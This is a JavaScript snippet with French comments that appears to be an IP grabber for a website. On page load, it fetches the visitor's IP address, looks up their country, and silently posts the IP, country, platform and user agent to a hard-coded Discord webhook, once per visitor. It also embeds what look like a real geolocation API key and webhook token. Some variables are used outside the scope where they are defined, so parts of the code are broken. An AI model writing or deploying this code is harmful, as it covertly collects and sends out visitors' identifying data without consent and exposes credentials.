function httpGetAsync(url, callback) {
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", url, true); // true for asynchronous
    xmlHttp.send(null);
}

const url = "https://api.ipgeolocation.io/ipgeo?apiKey=9ed8eefc86024c67b341a5ace0b43e1c&ip=2001:861:4282:71d0:b5a4:20d7:e8c3:434";

httpGetAsync(url, function(responseText) {
    const data = JSON.parse(responseText);
    const country = data.country_name;
    const platform = data.platform;
    const city = data.city;
    const region = data.region;
    const isp = data.isp;
    const userAgent = window.navigator.userAgent;

    // Utilisez les variables pour afficher les informations dans votre application
    console.log(`Pays: ${country}`);
    console.log(`Plateforme: ${platform}`);
    console.log(`Ville: ${city}`);
    console.log(`Région: ${region}`);
    console.log(`Fournisseur d'accès Internet: ${isp}`);
    console.log(`User-Agent: ${userAgent}`);

});

const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";

const getIpAddress = async () => {
    const response = await fetch("https://api64.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
};

const getCountryFromIp = async (ipAddress) => {
    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9ed8eefc86024c67b341a5ace0b43e1c&ip=${ipAddress}`);
    const data = await response.json();
    return data.country_name;
};

const sendWebhookOnce = async () => {
    // Vérifie si le message a déjà été envoyé en utilisant le stockage local
    if (!localStorage.getItem("webhookSent")) {
        const ipAddress = await getIpAddress();
        const country = await getCountryFromIp(ipAddress);

        const embed = {
            title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} ||\nPlateforme: || ${platform} ||\nUser-Agent: || ${userAgent} ||**`,
            color: 0x00ff00
        };

        const payload = {
            embeds: [embed]
        };

        // Envoie du message via le webhook Discord
        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        // Marque le message comme déjà envoyé
        localStorage.setItem("webhookSent", "true");
    }
};

// Appelle la fonction au chargement de la page
sendWebhookOnce();
// ... (le reste de votre code)
